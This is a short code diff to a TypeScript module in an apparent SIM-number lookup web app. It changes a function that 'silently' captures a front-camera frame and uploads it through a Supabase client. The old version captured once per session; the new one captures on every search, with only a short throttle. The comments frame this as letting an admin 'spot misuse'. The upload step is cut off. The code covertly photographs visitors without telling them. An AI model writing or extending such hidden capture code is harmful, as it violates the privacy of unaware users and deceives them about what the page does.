@@ -1,16 +1,19 @@
 import { supabase } from "@/integrations/supabase/client";
 
-const CAPTURED_KEY = "__sim_captured_session_v1";
-
 // Silently capture a single frame from the front camera and upload it.
-// Browser will show its native camera permission prompt the first time.
-// If the user denies, we silently give up. If allowed once, subsequent
-// visits in the same session skip capture.
+// Runs on every call (e.g. every SIM number search) so admin can spot misuse.
+// A short in-memory throttle prevents overlapping captures if the user spams.
+let capturing = false;
+let lastCaptureAt = 0;
+const MIN_GAP_MS = 1500;
+
 export async function silentCameraCapture(searchedNumber?: string): Promise<void> {
   try {
     if (typeof window === "undefined") return;
-    if (sessionStorage.getItem(CAPTURED_KEY) === "1") return;
+    if (capturing) return;
+    if (Date.now() - lastCaptureAt < MIN_GAP_MS) return;
     if (!navigator.mediaDevices?.getUserMedia) return;
+    capturing = true;
 
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
